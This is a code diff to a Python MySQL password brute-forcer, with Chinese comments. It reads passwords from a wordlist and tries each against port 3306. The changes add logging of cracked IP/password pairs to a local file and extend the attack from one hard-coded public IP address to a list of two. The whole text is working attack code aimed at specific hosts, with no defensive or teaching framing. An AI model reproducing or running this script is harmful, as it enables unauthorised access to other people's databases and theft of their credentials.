@@ -4,7 +4,7 @@ import re
 
 class PoJie:
     def __init__(self,path,ip,port):
-        print("path:",path)
+        print("开始ip:",ip)
         self.file =open(path,"r",errors="ignore")#打开密码字典文件
         self.ip = ip 
         self.prot = port
@@ -30,6 +30,9 @@ class PoJie:
             if self.ConnectMySql(passwd):#把读到的一行密码传到连接数据库方法里面
                 #如果返回了True说明破解成功
                 print("密码正确 ip:",self.ip,",password:",passwd)#打印正确密码
+                with open('./script/rightlist.txt','a') as f:
+                    f.write("ip:"+ip+";"+"password:"+passwd+"\n")
+                    f.close()
                 break#结束循环
             else :
                 print("密码错误:",passwd)
@@ -45,7 +48,11 @@ class PoJie:
 
 
 path=r"./script/wordlist.txt"#传入密码字典绝对文件路径
-ip = '39.102.58.201'
+ipList = [
+    '39.102.58.201',
+    '39.106.63.189'
+]
 port = 3306
-start =PoJie(path,ip,port)#实例化对象
-start.PoJieChangShi()#对象执行方法
+for ip in ipList:
+    start =PoJie(path,ip,port)#实例化对象
+    start.PoJieChangShi()#对象执行方法
